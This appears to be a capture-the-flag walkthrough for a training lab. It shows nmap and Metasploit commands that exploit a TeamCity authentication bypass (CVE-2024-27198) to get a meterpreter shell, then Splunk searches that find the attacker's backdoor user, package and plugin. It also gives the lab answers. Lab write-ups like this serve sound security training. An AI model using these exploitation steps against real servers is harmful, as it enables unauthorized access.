# Brains walkthrough (easy)

## Exploit

http (port 80) on machine is under maintenance

`nmap -A -O <machine ip>`

reveals Jetbrains TeamCity login page on TCP 50000

Search for Teamcity vulnerabilities reveals CVE 2024-27198 authentication bypass

Fire up msfconsole

```
search teamcity

use 4

setg RHOSTS machine ip
setg RPORT 50000
exploit
```

Successful exploit opens meterpreter shell on target

flag can be found at /home/ubuntu/flag.txt

## Detection

### What is the name of the backdoor user which was created on the server after exploitation?


We are looking for user accounts so let's start by just reviewing anything that references users

Splunk search  

```
index=* user
```

Closing in on the events of July 4, 2024 we see a pretty blatant username pop up.


`eviluser`


### What is the name of the malicious-looking package installed on the server?

Since this is referencing an installed package let's review the dpkg logs to see what's been installed

```
index=* source=/var/log/dpkg.log
```

Focusing on the same timeframe that the "eviluser" account was created, there is one installed package with an interesting name 

`datacollector `

### What is the name of the plugin installed on the server after successful exploitation?

Once again, a simple search for "plugin" related entries will reveal the answer, which is especially apparent by singling out the events of 7/4/24 as there is only one entry

```
index=* plugin 
```

`AyzzbuXY.zip`